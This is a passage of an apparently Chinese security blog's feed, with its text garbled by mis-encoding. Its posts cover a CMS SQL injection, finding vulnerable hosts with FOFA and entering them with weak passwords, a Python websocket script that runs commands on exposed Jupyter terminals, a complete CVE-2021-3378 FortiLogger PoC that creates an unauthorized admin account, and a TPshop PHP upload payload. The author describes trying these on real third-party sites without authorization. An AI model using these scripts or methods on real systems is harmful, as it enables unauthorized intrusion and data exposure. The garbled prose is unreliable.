<figure data-type="image" tabindex="17"><img src="https://z3.ax1x.com/2021/09/22/4N7acD.png" alt="4N7acD.png" loading="lazy"></figure>
<p>æŠ¥é”™çš„åŸå› åœ¨äºcatidä¸ºç©º</p>
<figure data-type="image" tabindex="18"><img src="https://z3.ax1x.com/2021/09/22/4N7Yh6.png" alt="4N7Yh6.png" loading="lazy"></figure>
<p>aid=999æ—¶æŸ¥è¯¢åˆ°ç»“æœä¸ºç©º</p>
<figure data-type="image" tabindex="19"><img src="https://z3.ax1x.com/2021/09/22/4N7N9K.png" alt="4N7N9K.png" loading="lazy"></figure>
<p>å®é™…ä¸Šåœ¨æ‰§è¡Œ</p>
<pre><code class="language-sql">SELECT *,my_field,my_tagone,my_shopping_model,my_shopping_color FROM `cmseasy_archive`  WHERE `aid`='999' and (state IS NULL or state&lt;&gt;'-1')  ORDER BY 1 desc LIMIT 1;
</code></pre>
<p>åç›´æ¥å–å€¼è·å–catidçš„å€¼</p>
<figure data-type="image" tabindex="20"><img src="https://z3.ax1x.com/2021/09/22/4N7U1O.png" alt="4N7U1O.png" loading="lazy"></figure>
<p>ä½†æ˜¯cmsä¸­å†…ç½®äº†è¿‡æ»¤ï¼Œä¸”å¯¹URLä¸­çš„ç‰¹æ®Šç¬¦å·åšäº†å¤„ç†ï¼Œæ— æ³•ç»•è¿‡ã€‚</p>
<figure data-type="image" tabindex="21"><img src="https://z3.ax1x.com/2021/09/22/4N70nH.png" alt="4N70nH.png" loading="lazy"></figure>
<p>æ‰€ä»¥è™½ç„¶å­˜åœ¨æ³¨å…¥ç‚¹ä½†æ˜¯æ— æ³•åˆ©ç”¨........................</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ä»æ¼æ´é¢„è­¦åˆ°POCå®ç°]]></title>
        <id>https://ja9er.github.io/post/cong-lou-dong-yu-jing-dao-poc-shi-xian/</id>
        <link href="https://ja9er.github.io/post/cong-lou-dong-yu-jing-dao-poc-shi-xian/">
        </link>
        <updated>2021-08-12T10:03:14.000Z</updated>
        <content type="html"><![CDATA[<h1 id="ä»æ¼æ´é¢„è­¦åˆ°pocå®ç°">ä»æ¼æ´é¢„è­¦åˆ°POCå®ç°</h1>
<h2 id="0x01-äººç”Ÿæ˜¯ä¸€ä¸ªæ‘†æ»¡é¤å…·çš„èŒ¶å‡ ">0X01 äººç”Ÿæ˜¯ä¸€ä¸ªæ‘†æ»¡é¤å…·çš„èŒ¶å‡ </h2>
<p>2021å¹´7æœˆ13æ—¥ç½‘ä¿¡åŠå‘æ–‡ã€‚9æœˆ1æ—¥è½åœ°</p>
<blockquote>
<p>1ã€ä¸å¾—å‘å¸ƒæˆ–è€…æä¾›ä¸“é—¨ç”¨äºåˆ©ç”¨ç½‘ç»œäº§å“å®‰å…¨æ¼æ´ä»äº‹å±å®³ç½‘ç»œå®‰å…¨æ´»åŠ¨çš„ç¨‹åºå’Œå·¥å…·ã€‚</p>
<p>2ã€åœ¨å›½å®¶ä¸¾åŠé‡å¤§æ´»åŠ¨æœŸé—´ï¼Œæœªç»å…¬å®‰éƒ¨åŒæ„ï¼Œä¸å¾—æ“…è‡ªå‘å¸ƒç½‘ç»œäº§å“å®‰å…¨æ¼æ´ä¿¡æ¯ã€‚</p>
<p>3ã€ä¸å¾—å°†æœªå…¬å¼€çš„ç½‘ç»œäº§å“å®‰å…¨æ¼æ´ä¿¡æ¯å‘ç½‘ç»œäº§å“æä¾›è€…ä¹‹å¤–çš„å¢ƒå¤–ç»„ç»‡æˆ–è€…ä¸ªäººæä¾›ã€‚</p>
</blockquote>
<p>æ€»ç»“æ¥è¯´å°±æ˜¯ä¸è¦ä¹±å‘æ¼æ´EXPå’ŒPOCï¼Œç½‘ä¸Šçš„æ–‡åº“å’Œå¸ˆå‚…ä¸€å¤œä¹‹é—´è·‘è·¯å¤§åŠã€‚å±äºæ˜¯è„šæœ¬å°å­ã®å¤§æœ«æ—¥äº†ã€‚</p>
<p>é‚£ä¹ˆï¼Œä½œä¸ºä¸€ä¸ªèœé¸¡ï¼Œè¦æ€ä¹ˆåœ¨èŒ«èŒ«ç½‘æµ·ä¸­æ‰©å……è‡ªå·±çš„æ­¦å™¨åº“å‘¢</p>
<h2 id="0x02-ç®€å•è®²è®²ä¸€ä¸ªæ€è·¯">0X02 ç®€å•è®²è®²ä¸€ä¸ªæ€è·¯</h2>
<p><strong>CNVD,WangAnç­‰æ¼æ´å¹³å°</strong></p>
<p>è¿™äº›å¹³å°éƒ½ä¼šé¢„è­¦æŸæŸç³»ç»Ÿå­˜åœ¨æŸæŸæ¼æ´ï¼Œä»”ç»†æ‰¾æ‰¾å°±èƒ½å‘ç°æƒŠå–œ<br>
<a href="https://imgtu.com/i/f0SrTS"><img src="https://z3.ax1x.com/2021/08/12/f0SrTS.png" alt="f0SrTS.png" loading="lazy"></a><br>
<a href="https://imgtu.com/i/f0S6YQ"><img src="https://z3.ax1x.com/2021/08/12/f0S6YQ.png" alt="f0S6YQ.png" loading="lazy"></a></p>
<h2 id="0x03-ç®€å•çš„å®ç°">0X03 ç®€å•çš„å®ç°</h2>
<p>è¿™é‡Œæˆ‘ä»¬éšä¾¿ç‚¹ä¸€ä¸ªè¿›å»ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªæœªæˆæƒè®¿é—®çš„æ¼æ´ï¼Œå¹¶ä¸”å½±å“äº§å“ç»™å‡ºäº†ä¸€ä¸ªå¾ˆè¯¦ç»†ä¿¡æ¯<br>
<a href="https://imgtu.com/i/f0SDw8"><img src="https://z3.ax1x.com/2021/08/12/f0SDw8.png" alt="f0SDw8.png" loading="lazy"></a><br>
æ¥ä¸‹æ¥å°±æ˜¯æƒ³æƒ³æ€ä¹ˆå¤ç°å®ƒäº†ï¼Œé¦–å…ˆæœäº†æœåŒç³»ç»Ÿçš„åå­—å‘ç°è¿˜æœ‰å¼±å£ä»¤<br>
<a href="https://imgtu.com/i/f0SBef"><img src="https://z3.ax1x.com/2021/08/12/f0SBef.png" alt="f0SBef.png" loading="lazy"></a><br>
è¿™æ³¢å•Šï¼Œè¿™æ³¢æ˜¯ç¨³ç¨³åœ°å¹¸ç¦ï¼æˆ‘ä»¬ç›´æ¥fofaè§å¥½ä¼ã€‚</p>
<blockquote>
<p>FOFA æ˜¯ç™½å¸½æ±‡æ¨å‡ºçš„ä¸€æ¬¾ç½‘ç»œç©ºé—´èµ„äº§æœç´¢å¼•æ“ã€‚å®ƒèƒ½å¤Ÿå¸®åŠ©ç”¨æˆ·è¿…é€Ÿè¿›è¡Œç½‘ç»œèµ„äº§åŒ¹é…ã€åŠ å¿«åç»­å·¥ä½œè¿›ç¨‹ã€‚ä¾‹å¦‚è¿›è¡Œæ¼æ´å½±å“èŒƒå›´åˆ†æã€åº”ç”¨åˆ†å¸ƒç»Ÿè®¡ã€åº”ç”¨æµè¡Œåº¦æ’åç»Ÿè®¡ç­‰ã€‚<br>
ç®€å•ç†è§£å°±æ˜¯ï¼Œä¸€ä¸ªæœ¬åœŸåŠ å¼ºç‰ˆshodanï¼ŒçŸ¥é“æŸäº§å“åœ¨äº’è”ç½‘çš„éƒ¨ç½²æƒ…å†µã€è·å–ä¸€ä¸ªæ ¹åŸŸåæ‰€æœ‰å­åŸŸåç½‘ç«™ã€æ ¹æ®IPç¡®è®¤ä¼ä¸šã€æ ¹æ®ä¸€ä¸ªå­åŸŸåç½‘ç«™æ‰¾åˆ°è·Ÿä»–åœ¨ä¸€ä¸ªIPçš„å…¶ä»–ç½‘ç«™ã€å…¨ç½‘æ¼æ´æ‰«æã€ä¸€ä¸ªæ–°çš„æ¼æ´å…¨ç½‘çš„å½±å“èŒƒå›´ã€‚</p>
</blockquote>
<p>ç®€å•æ¥è¯´ï¼Œfofaå°±æ˜¯ä¸€ä¸ªIP PLUS+++ç‰ˆæœ¬çš„è°·æ­Œã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒå¯»æ‰¾åˆ°å…·æœ‰ç›¸åŒç½‘é¡µç»“æ„ç‰¹å¾çš„ç½‘ç«™ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¯ä»¥æ„é€ æŒ‡çº¹æ¥å‘ç°ç›¸åŒçš„ç³»ç»Ÿã€‚</p>
<p>é¦–å…ˆå»ºè®®ä½¿ç”¨<code>body=&quot;xxxxxç³»ç»Ÿ&quot;</code>æˆ–è€…<code>title=&quot;xxxç³»ç»Ÿ&quot;</code>æ¥æ‰¾åˆ°ç›®æ ‡ç³»ç»Ÿï¼Œç„¶åè§‚å¯Ÿè¯¥ç½‘ç«™çš„ç»“æ„ç»†åŒ–æŒ‡çº¹è¿›è€Œè·å–åˆ°å…¨ç½‘çš„ç«™ç‚¹</p>
<p>æœç´¢ç»“æœå¦‚ä¸‹<br>
<a href="https://imgtu.com/i/f0SyFg"><img src="https://z3.ax1x.com/2021/08/12/f0SyFg.png" alt="f0SyFg.png" loading="lazy"></a><br>
éšä¾¿æ‰¾ä¸ªç«™ç‚¹ç‚¹è¿›å»ï¼Œè§‚å¯Ÿä¸€ä¸‹ç½‘é¡µç»“æ„ï¼Œæˆ‘ä»¬ç»§ç»­ç»†åŒ–æŒ‡çº¹<br>
<a href="https://imgtu.com/i/f0ScWj"><img src="https://z3.ax1x.com/2021/08/12/f0ScWj.png" alt="f0ScWj.png" loading="lazy"></a><br>
ç„¶åå°è¯•å¼±å£ä»¤ç™»å½•ï¼Œè¯•äº†å‡ ä¸ªç«™è¿›äº†åå°<br>
<a href="https://imgtu.com/i/f0S2Ss"><img src="https://z3.ax1x.com/2021/08/12/f0S2Ss.png" alt="f0S2Ss.png" loading="lazy"></a><br>
è¿™æ—¶å€™å›åˆ°åˆšå¼€å§‹çš„æ¼æ´é¢„è­¦ï¼Œ<code>æœªæˆæƒè®¿é—®è·å–æ•æ„Ÿä¿¡æ¯</code>ï¼Œå°±å¾€è¿™ä¸ªæ–¹å‘è¿›è¡Œé»‘ç›’æµ‹è¯•</p>
<p>æŠ“åŒ…æµ‹è¯•å‘ç°è¿˜æ˜¯æœ‰sessionéªŒè¯çš„<br>
<a href="https://imgtu.com/i/f0SRln"><img src="https://z3.ax1x.com/2021/08/12/f0SRln.png" alt="f0SRln.png" loading="lazy"></a><br>
ä¸è¿‡å‘ç°ä¸€ä¸ªç‚¹å…·æœ‰å¯¼å‡ºåŠŸèƒ½ï¼Œå¯¼å‡ºçš„æ–‡ä»¶ä¿å­˜åœ¨ç½‘ç«™çš„è·¯å¾„ä¸‹<br>
<a href="https://imgtu.com/i/f0SfO0"><img src="https://z3.ax1x.com/2021/08/12/f0SfO0.png" alt="f0SfO0.png" loading="lazy"></a><br>
è¿™æ—¶å€™ç›´æ¥è®¿é—®è¯¥è·¯å¾„ï¼Œå‘ç°å¯ä»¥è®¿é—®ï¼Œç„¶åå›é€€ç›®å½•é¡ºåˆ©çš„å‘ç°äº†ä¸€ä¸ªåˆ—ç›®å½•æ¼æ´<br>
<a href="https://imgtu.com/i/f0SWyq"><img src="https://z3.ax1x.com/2021/08/12/f0SWyq.png" alt="f0SWyq.png" loading="lazy"></a><br>
photoè·¯å¾„ä¸‹å­˜åœ¨å¤§é‡çš„äººè„¸ç…§ç‰‡ï¼Œæ¸…é™¤cookieæµ‹è¯•æ˜¯å¦å­˜åœ¨æœªæˆæƒ<br>
<a href="https://imgtu.com/i/f0S4mV"><img src="https://z3.ax1x.com/2021/08/12/f0S4mV.png" alt="f0S4mV.png" loading="lazy"></a><br>
<a href="https://imgtu.com/i/f0S5wT"><img src="https://z3.ax1x.com/2021/08/12/f0S5wT.png" alt="f0S5wT.png" loading="lazy"></a></p>
<h2 id="0x04-poc">0x04 POC</h2>
<p>å¦‚æœè‡ªå·±æ²¡æœ‰å¼€å‘æ‰«æå™¨çš„è¯ï¼Œå»ºè®®è¿˜æ˜¯æŒ‰ç…§POCSUITE3æ ¼å¼å†™</p>
<p>Github åœ°å€ : https://github.com/knownsec/pocsuite3</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ä¸€æ¬¡ä»æœªæˆæƒå¼€å§‹çš„ç ”ç©¶]]></title>
        <id>https://ja9er.github.io/post/yi-ci-cong-wei-shou-quan-kai-shi-de-yan-jiu/</id>
        <link href="https://ja9er.github.io/post/yi-ci-cong-wei-shou-quan-kai-shi-de-yan-jiu/">
        </link>
        <updated>2021-07-06T10:02:30.000Z</updated>
        <content type="html"><![CDATA[<h1 id="0x01-å¼€å§‹">0x01 å¼€å§‹</h1>
<p>æ‘¸é±¼çœ‹åˆ°æ–‡ç« </p>
<blockquote>
<p>Jupyter-Notebookæ˜¯åŸºäºç½‘é¡µçš„ç”¨äºäº¤äº’è®¡ç®—çš„åº”ç”¨ç¨‹åºã€‚å…¶å¯è¢«åº”ç”¨äºå…¨è¿‡ç¨‹è®¡ç®—ï¼šå¼€å‘ã€æ–‡æ¡£ç¼–å†™ã€è¿è¡Œä»£ç å’Œå±•ç¤ºç»“æœã€‚â€”â€”<a href="https://link.jianshu.com/?t=https%3A%2F%2Fjupyter-notebook.readthedocs.io%2Fen%2Fstable%2Fnotebook.html">Jupyter Notebookå®˜æ–¹ä»‹ç»</a></p>
</blockquote>
<p>ç®€è€Œè¨€ä¹‹ï¼ŒJupyter Notebookæ˜¯ä»¥ç½‘é¡µçš„å½¢å¼æ‰“å¼€ï¼Œå¯ä»¥åœ¨ç½‘é¡µé¡µé¢ä¸­<strong>ç›´æ¥</strong>ç¼–å†™ä»£ç å’Œè¿è¡Œä»£ç ï¼Œä»£ç çš„è¿è¡Œç»“æœä¹Ÿä¼šç›´æ¥åœ¨ä»£ç å—ä¸‹æ˜¾ç¤ºã€‚</p>
<blockquote>
<p>å¦‚æœç®¡ç†å‘˜æœªä¸ºJupyter Notebooké…ç½®å¯†ç ï¼Œå°†å¯¼è‡´æœªæˆæƒè®¿é—®æ¼æ´ï¼Œæ¸¸å®¢å¯åœ¨å…¶ä¸­åˆ›å»ºä¸€ä¸ªconsoleå¹¶æ‰§è¡Œä»»æ„Pythonä»£ç å’Œå‘½ä»¤ã€‚</p>
</blockquote>
<p>éšä¾¿æ‰¾æ‰¾ï¼Œå¥½å®¶ä¼™è¿™ä¹ˆå¤š<br>
<a href="https://imgtu.com/i/R7URb9"><img src="https://z3.ax1x.com/2021/07/06/R7URb9.md.png" alt="R7URb9.md.png" loading="lazy"></a></p>
<h1 id="0x02-å¤ç°ä»¥åŠä¸€ç‚¹å°ç ”ç©¶">0x02 å¤ç°ï¼Œä»¥åŠä¸€ç‚¹å°ç ”ç©¶</h1>
<p>æ‰¾ä¸€ä¸ªç«™ç‚¹ï¼Œæ‰€è°“çš„æœªæˆæƒï¼Œå¤§å¤§çš„Terminaléå¸¸åŠ¨äºº<br>
<a href="https://imgtu.com/i/R7U7vD"><img src="https://z3.ax1x.com/2021/07/06/R7U7vD.md.png" alt="R7U7vD.md.png" loading="lazy"></a><br>
æŸ¥çœ‹æƒé™ï¼Œrootã€‚æŒ‰ç†æ¥è¯´è¿™æ¬¡ç®€å•çš„å¤ç°åˆ°æ­¤ä¸ºæ­¢ï¼Œä½†æ˜¯ä»Šå¤©æ¯”è¾ƒå¥½å¥‡ï¼Œå› ä¸ºä¸€ç›´ä»¥æ¥æœ‰ä¸ªç–‘é—®ï¼Œé˜¿é‡Œäº‘è¿™ç±»ç½‘é¡µå®ç°çš„consoleæ˜¯æ€ä¹ˆå’ŒæœåŠ¡å™¨äº¤äº’çš„ã€‚<br>
<a href="https://imgtu.com/i/R7U2DJ"><img src="https://z3.ax1x.com/2021/07/06/R7U2DJ.md.png" alt="R7U2DJ.md.png" loading="lazy"></a><br>
åˆšå¼€å§‹ä¹ æƒ¯æ€§çš„å¼€äº†BurpæŠ“æŠ“åŒ…ï¼Œä¸è¿‡æ²¡åŠæ³•åŠ è½½å‡ºconsoleç•Œé¢ï¼Œçœ‹æ¥ä¸æ˜¯èµ°çš„HTTPåè®®ã€‚æ‰“å¼€wiresharkè·Ÿè¸ªæµçœ‹çœ‹ï¼Œå¯ä»¥çœ‹åˆ°è¿”å›åŒ…çš„æ ‡å¿—æ˜¯[&quot;stdout&quot;,&quot; &quot;],è¾“å…¥ä»€ä¹ˆï¼Œå“åº”ä»€ä¹ˆï¼Œå¤–åŠ è¾“å…¥çš„ç»“æœä¸€å¹¶è¿”å›<br>
<a href="https://imgtu.com/i/R7UqDH"><img src="https://z3.ax1x.com/2021/07/06/R7UqDH.md.png" alt="R7UqDH.md.png" loading="lazy"></a><br>
å•è¾“å…¥ä¸€ä¸ªlæµ‹è¯•ï¼Œæ³¨æ„è¿™é‡Œå¹¶æ²¡æœ‰å›è½¦<br>
<a href="https://imgtu.com/i/R7UbKe"><img src="https://z3.ax1x.com/2021/07/06/R7UbKe.md.png" alt="R7UbKe.md.png" loading="lazy"></a><br>
çŸ¥é“æ˜¯æ€ä¹ˆè·å–ç»“æœçš„äº†ï¼Œä½†æ˜¯è¿˜æ˜¯ä¸æ¸…æ¥šè¿™é‡Œçš„è¾“å…¥æ˜¯æ€ä¹ˆå‘å‡ºå»çš„ã€‚å› ä¸ºä¹‹å‰ä¸Šburpæ²¡åŠ è½½åˆ°ç½‘é¡µï¼ŒçŒœæµ‹å’ŒJSæœ‰å…³ã€‚äºæ˜¯ç¿»äº†ç¿»JSæ–‡ä»¶ï¼Œæœç„¶æ‰¾åˆ°ä¸€ä¸ªterminado.jsã€‚ä¸€çœ‹ä»£ç å°±ç‰¹åˆ«æ¸…æ¥šäº†ï¼Œå¦¥å¦¥çš„websocketæ ‡å‡†ç”¨æ³•ã€‚å‡½æ•°make_terminalçš„ä¸¤ä¸ªå‚æ•°ï¼Œelementå’Œws_urlã€‚elementç”¨äºç”ŸæˆèŠ‚ç‚¹ï¼Œws_urlä½¿ç”¨æ—¶ä¼ å…¥çš„å®å‚æ˜¯ç”±å¦ä¸€ä¸ªconfig.jsä¸­é…ç½®çš„websocket çš„url</p>
<pre><code class="language-python">define ('terminal/js/terminado',[&quot;xterm&quot;, &quot;xtermjs-fit&quot;], function(Terminal, fit) {
    &quot;use strict&quot;;
    function make_terminal(element, ws_url) {
        
        var ws = new WebSocket(ws_url);
        Terminal.applyAddon(fit);
        var term = new Terminal();
        ws.onopen = function(event) {
            term.on('data', function(data) {
                ws.send(JSON.stringify(['stdin', data]));
            });
            
            term.on('title', function(title) {
                document.title = title;
            });
            
            term.open(element);
            term.fit();
            // send the terminal size to the server.
            ws.send(JSON.stringify([&quot;set_size&quot;, term.rows, term.cols,
                                        window.innerHeight, window.innerWidth]));

            ws.onmessage = function(event) {
                var json_msg = JSON.parse(event.data);
                switch(json_msg[0]) {
                    case &quot;stdout&quot;:
                        term.write(json_msg[1]);
                        break;
                    case &quot;disconnect&quot;:
                        term.write(&quot;\r\n\r\n[CLOSED]\r\n&quot;);
                        break;
                }
            };
        };
        return {socket: ws, term: term};
    }

    return {make_terminal: make_terminal};
});


</code></pre>
<p>è¿™å…¶ä¸­ <code>ws.send(JSON.stringify(['stdin', data]));</code>ä¼ é€’è¾“å…¥çš„æ¶ˆæ¯,<code>ws.onmessage</code>è·å–websocketç«¯è¿”å›çš„æ¶ˆæ¯ã€‚æˆ‘ä»¬å¯ä»¥æ‰“ä¸ªæ–­ç‚¹çœ‹çœ‹ã€‚</p>
<p>é¦–å…ˆæŒ‰ä¸‹å›è½¦<br>
<a href="https://imgtu.com/i/R7UfER"><img src="https://z3.ax1x.com/2021/07/06/R7UfER.png" alt="R7UfER.png" loading="lazy"></a></p>
<p>æ§åˆ¶å°æ‰“å‡ºæ¥ï¼Œçœ‹çœ‹ws åˆ°åº•sendäº†ä¸ªå•¥ç©æ„å„¿ã€‚<br>
<a href="https://imgtu.com/i/R7UhU1"><img src="https://z3.ax1x.com/2021/07/06/R7UhU1.png" alt="R7UhU1.png" loading="lazy"></a></p>
<p>&quot;\\r&quot;,å›è½¦çš„è½¬ä¹‰ç¬¦å·ã€‚çœ‹èµ·æ¥&quot;[&quot;stdin&quot;,&quot;\r&quot;]&quot;å°±æ˜¯sendåˆ°serverç«¯çš„å¥¥ç§˜ã€‚æ­¤æ—¶ï¼Œä¸€ä¸ªå¤§èƒ†ä¸”å®Œæ•´çš„æƒ³æ³•å·²ç»å›è¡åœ¨æˆ‘çš„è„‘æµ·é‡Œäº†ï¼Œåªå·®æœ€åä¸€ä¸ªæ‹¼å›¾ã€‚å†™ä½œä¹Ÿè®²ç©¶äººç‰©åœ°ç‚¹æ—¶é—´ä¸‰è¦ç´ ï¼Œæ˜¾ç„¶ï¼Œsendï¼Œä½ ä¹Ÿè¦æœ‰ä¸ªsendå‡ºå»çš„åœ°å€ï¼Œè¿™å°±æ˜¯websocketçš„serverç«¯ã€‚</p>
<p>åœ¨ä¹‹å‰çš„jsä¸­æœ‰è¿™ä¹ˆä¸€æ®µ<code>var ws = new WebSocket(ws_url);</code>ï¼Œå¾ˆæ˜¾ç„¶è¿™å°±æ˜¯æˆ‘ä»¬è¦è¿½å¯»çš„ç­”æ¡ˆ</p>
<pre><code class="language-python">ws://ip:port/terminals/websocket/5 #serverç«¯åœ°å€
</code></pre>
<figure data-type="image" tabindex="1"><a href="https://imgtu.com/i/R7U44x"><img src="https://z3.ax1x.com/2021/07/06/R7U44x.png" alt="R7U44x.png" loading="lazy"></a></figure>
<h1 id="0x03-pythonå®ç°å‘½ä»¤æ‰§è¡Œ">0x03 Pythonå®ç°å‘½ä»¤æ‰§è¡Œ</h1>
<p>æœ€åï¼Œç”¨pythonå®ç°ç®€å•çš„æ§åˆ¶,è¿™æ®µä»£ç è¿˜æ˜¯æœ‰bugçš„ã€‚åé¢å†æ”¹å§ï¼ŒåŒæ­¥é—®é¢˜å®åœ¨å¤ªå‘äº†</p>
<pre><code class="language-python">from websocket import create_connection
cmd=&quot;whoami&quot;
target = 'ws://IP:PORT/terminals/websocket/4'
ws = create_connection(target)
ws.send(&quot;[\&quot;stdin\&quot;,\&quot;{} \\r \&quot;]&quot;.format(cmd))
lists=[]
for i in range(0,4):
    res = ws.recv()
    lists.append(res)
key=-1
for index,j in enumerate(lists):
    if cmd in j:
        key=index
        break
print lists[key+1]
</code></pre>
<figure data-type="image" tabindex="2"><a href="https://imgtu.com/i/R7UIC6"><img src="https://z3.ax1x.com/2021/07/06/R7UIC6.png" alt="R7UIC6.png" loading="lazy"></a></figure>
<hr>
<p>ä¿®æ”¹åçš„ä»£ç ï¼ŒåŸºæœ¬å¯æ§äº†</p>
<pre><code class="language-python">from websocket import create_connection
result=&quot;&quot;
cmd=&quot;whoami&quot;
target = 'ws://IP:PORT/terminals/websocket/4'
ws = create_connection(target)

ws.send(&quot;[\&quot;stdin\&quot;,\&quot;{} \\r \&quot;]&quot;.format(cmd))

def get_list(NUM):
    lists=[]
    for i in range(0, NUM):
        res = ws.recv()
        lists.append(res)
    return lists

def find_result(lists):
    key = -1
    for index, j in enumerate(lists):
        if cmd in j:
            key = index
            break
    return key

while True:
    try:
        list = get_list(4)
        key = find_result(list)
        if key &gt;= 0:
            if key + 1 &gt; 3:
                list = get_list(1)
                result = list[0]
                break
            else:
                result = list[key + 1]
                break
    except Exception as e:
        break


print result


</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[(CVE-2021-3378) FortiLogger ä»»æ„ç”¨æˆ·åˆ›å»º POC]]></title>
        <id>https://ja9er.github.io/post/cve-2021-3378-fortilogger-ren-yi-yong-hu-chuang-jian-poc/</id>
        <link href="https://ja9er.github.io/post/cve-2021-3378-fortilogger-ren-yi-yong-hu-chuang-jian-poc/">
        </link>
        <updated>2021-07-05T13:01:55.000Z</updated>
        <content type="html"><![CDATA[<h1 id="ä¹‹å‰å†™çš„å°ç©æ„å„¿-æ”¾å‡ºæ¥åº·åº·">ä¹‹å‰å†™çš„å°ç©æ„å„¿ã€‚æ”¾å‡ºæ¥åº·åº·</h1>
<blockquote>
<p>RZK Fortiloggeræ˜¯åœŸè€³å…¶RZKå…¬å¸çš„ä¸€ä¸ªå¯ä¸ºWindowsç³»ç»Ÿä¸ŠFortiGateé˜²ç«å¢™è¿›è¡Œå³æ—¶çŠ¶æ€è·Ÿè¸ªï¼Œæ—¥å¿—è®°å½•ï¼Œæœç´¢/è¿‡æ»¤ï¼ŒæŠ¥å‘Šå’Œçƒ­ç‚¹ç­‰åŠŸèƒ½çš„å»ºç«™ç³»ç»Ÿã€‚</p>
</blockquote>
<p>FortiLogger 4.4.2.2 å­˜åœ¨å®‰å…¨æ¼æ´ï¼Œè¯¥æ¼æ´æºäºå—ä»»æ„æ–‡ä»¶ä¸Šä¼ çš„å½±å“ã€‚<br>
å¾ˆç®€å•ï¼Œå°±æ˜¯æ¥å£æœªæˆæƒçš„é—®é¢˜ï¼ŒåŒç†è¿˜æœ‰ä»»æ„æ–‡ä»¶ä¸Šä¼ ã€‚</p>
<p>å­˜å‚¨ç”¨æˆ·çš„æ¥å£</p>
<blockquote>
<p>/User/saveUser</p>
</blockquote>
<p>payloadä¸­çš„superadmin_profileï¼Œä¹Ÿå°±æ˜¯ç®¡ç†å‘˜å‡­è¯ï¼Œå¯ä»¥åœ¨æ¥å£</p>
<blockquote>
<p>/User/getProfile</p>
</blockquote>
<p>ä¸­æŸ¥çœ‹ï¼Œåªéœ€è¦æŠŠpayloadæ¢æˆ</p>
<blockquote>
<p>{<br>
'id':'all',<br>
}</p>
</blockquote>
<p>ç›´æ¥ä¸Šè„šæœ¬</p>
<pre><code class="language-python"># -*- coding: UTF-8 -*-
# !/usr/bin/python

import urllib3, argparse,json
import requests, sys, random

reload(sys)
sys.setdefaultencoding('utf8')
urllib3.disable_warnings()


def randomrequest():
    all_char = '0123456789qazwsxedcrfvtgbyhnujmikolpQAZWSXEDCRFVTGBYHNUJIKOLP'
    index = len(all_char)
    passward = ''
    for _ in range(4):
        n = random.randint(0, index - 1)
        passward += all_char[n]
    return passward


def poc(args):
    result = {'match': False, 'comment': 'ä¸å­˜åœ¨æ­¤æ¼æ´', 'others': {}}
    headers = {
        'Content-type': 'application/json',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'X-Requested-With': 'XMLHttpRequest'
    }
    headers2 = {
        # &quot;Host&quot;: &quot;%s:%s&quot; % (target, port,),
        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36&quot;,
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'X-Requested-With': 'XMLHttpRequest',
        'Connection': 'close',
    }
    rand = randomrequest()
    payload = '''{
              '_profilename':'superadmin_profile', 
              '_username': \'''' + rand + '''\', 
              '_password': 'test', 
              '_fullname':'', 
              '_email':''
              }'''
    data2 = &quot; &quot;

    url = str(args)
    try:
        req1 = requests.post(url + '/User/saveUser', headers=headers, verify=False, timeout=20, data=payload, )
        if req1.status_code == 200 and &quot;false&quot; in req1.text:
            req2 = requests.post(url + '/User/getUsers', headers=headers2, verify=False, timeout=20, data=data2, )
            if req2.status_code == 200 and rand in req2.text:
                result['match'] = True
                result['comment'] = 'user create:  ' + rand + ' ,password: test '
                return result
    except Exception, e:
        result['comment'] = e
        return result

    return result


if __name__ == &quot;__main__&quot;:
    result = {'match': False, 'comment': 'Not vulnerable', 'others': {}}
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', default='http://192.168.1.1:5000', help=&quot;input url like [url=http://192.168.1.1:5000]http://192.168.1.1:5000[/url]&quot;)
    args = parser.parse_args()
    result = poc(args.url)
    print json.dumps(result['comment'])
</code></pre>
<p>éªŒè¯æˆªå›¾<br>
<a href="https://imgtu.com/i/R5LQKg"><img src="https://z3.ax1x.com/2021/07/05/R5LQKg.md.png" alt="R5LQKg.md.png" loading="lazy"></a><br>
<a href="https://imgtu.com/i/R5LlrQ"><img src="https://z3.ax1x.com/2021/07/05/R5LlrQ.md.png" alt="R5LlrQ.md.png" loading="lazy"></a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ä»TPshopcmsåˆ°GetShell]]></title>
        <id>https://ja9er.github.io/post/cong-tpshopcms-dao-getshell1/</id>
        <link href="https://ja9er.github.io/post/cong-tpshopcms-dao-getshell1/">
        </link>
        <updated>2021-07-05T10:00:27.000Z</updated>
        <content type="html"><![CDATA[<h1 id="0x01-å¼€å§‹">0X01 å¼€å§‹</h1>
<p>æ—¥å¸¸å·¥ä½œä¸­æ—¥ç«™ï¼Œæ‰¾åˆ°ä¸€ä¸ªå†·é—¨cms-tpshopã€‚<br>
ç¥­å‡ºä¸‡èƒ½çš„ç™¾åº¦å¤§æ³•ï¼Œæœ‰æ´ï¼Œè¿˜æ˜¯å‰å°ï¼ï¼ï¼ å¯ä»¥æ<br>
ç»™ä¸€ä¸ªå‚è€ƒé“¾æ¥:<br>
https://www.seebug.org/vuldb/ssvid-96925</p>
<h1 id="0x02è¿‡ç¨‹">0x02è¿‡ç¨‹</h1>
<p><a href="https://imgtu.com/i/RWwgNF"><img src="https://z3.ax1x.com/2021/07/04/RWwgNF.md.png" alt="RWwgNF.md.png" loading="lazy"></a><br>
PD9waHAgcGhwaW5mbygpO3VubGluayhfX0ZJTEVfXyk7Pz4=</p>
<p>base64è§£ç ä¸ºï¼Œ</p>
<pre><code class="language-php">&lt;?php phpinfo();unlink(__FILE__);?&gt;
</code></pre>
<p>ä¼ äº†ä¸ªphpinfo()ä¸Šå»,è§‚å¯Ÿä¸€ä¸‹<br>
